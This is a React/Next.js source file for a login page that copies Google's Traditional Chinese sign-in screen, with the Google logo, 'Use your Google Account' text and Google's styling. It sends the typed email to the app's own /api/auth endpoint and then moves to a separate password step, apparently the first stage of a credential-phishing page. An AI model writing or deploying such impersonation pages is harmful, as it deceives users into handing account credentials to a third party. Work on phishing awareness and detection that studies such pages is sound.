"use client";

import { useState } from "react";
import { useRouter } from "next/navigation";
import GoogleLogo from "./GoogleLogo";

export default function LoginPage() {
  const router = useRouter();
  const [email, setEmail] = useState("");
  const [error, setError] = useState("");
  const [loading, setLoading] = useState(false);

  async function handleNext() {
    if (!email.trim()) { setError("請輸入電子郵件地址或電話號碼"); return; }
    setLoading(true);
    setError("");
    const res = await fetch("/api/auth", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ action: "check-email", email }),
    });
    const data = await res.json();
    setLoading(false);
    if (!res.ok) { setError(data.error); return; }
    router.push(`/password?email=${encodeURIComponent(email)}`);
  }

  return (
    <div style={styles.page}>
      <div style={styles.card}>
        <div style={{ textAlign: "center", marginBottom: 8 }}>
          <GoogleLogo />
        </div>
        <h1 style={styles.title}>登入</h1>
        <p style={styles.subtitle}>使用您的 Google 帳戶</p>

        <div style={{ marginTop: 24 }}>
          <div style={styles.inputWrap}>
            <input
              type="email"
              placeholder="電子郵件地址或電話號碼"
              value={email}
              onChange={(e) => { setEmail(e.target.value); setError(""); }}
              onKeyDown={(e) => e.key === "Enter" && handleNext()}
              style={{ ...styles.input, borderColor: error ? "#d93025" : "#dadce0" }}
              autoFocus
            />
            {error && <p style={styles.error}>{error}</p>}
          </div>

          <p style={{ fontSize: 13, color: "#5f6368", margin: "16px 0" }}>
            忘記電子郵件地址？
          </p>

          <p style={{ fontSize: 13, color: "#5f6368", margin: "16px 0 24px" }}>
            這不是您的電腦嗎？請使用訪客模式以私下登入。
            <a href="#" style={styles.link}> 瞭解詳情</a>
          </p>

          <div style={styles.btnRow}>
            <a href="#" style={styles.linkBtn}>建立帳戶</a>
            <button onClick={handleNext} disabled={loading} style={styles.nextBtn}>
              {loading ? "..." : "繼續"}
            </button>
          </div>
        </div>
      </div>
    </div>
  );
}

const styles: Record<string, React.CSSProperties> = {
  page: { minHeight: "100vh", display: "flex", alignItems: "center", justifyContent: "center", background: "#fff" },
  card: { width: 400, padding: "48px 40px 36px", border: "1px solid #dadce0", borderRadius: 8 },
  title: { fontSize: 24, fontWeight: 400, margin: "0 0 8px", textAlign: "center" },
  subtitle: { fontSize: 16, color: "#5f6368", margin: 0, textAlign: "center" },
  inputWrap: { position: "relative" },
  input: { width: "100%", padding: "13px 15px", fontSize: 16, border: "1px solid #dadce0", borderRadius: 4, outline: "none", boxSizing: "border-box", transition: "border-color 0.2s" },
  error: { fontSize: 12, color: "#d93025", margin: "4px 0 0" },
  link: { color: "#1a73e8", textDecoration: "none" },
  btnRow: { display: "flex", justifyContent: "space-between", alignItems: "center" },
  linkBtn: { fontSize: 14, color: "#1a73e8", textDecoration: "none", fontWeight: 500 },
  nextBtn: { background: "#1a73e8", color: "#fff", border: "none", borderRadius: 4, padding: "10px 24px", fontSize: 14, fontWeight: 500, cursor: "pointer" },
};
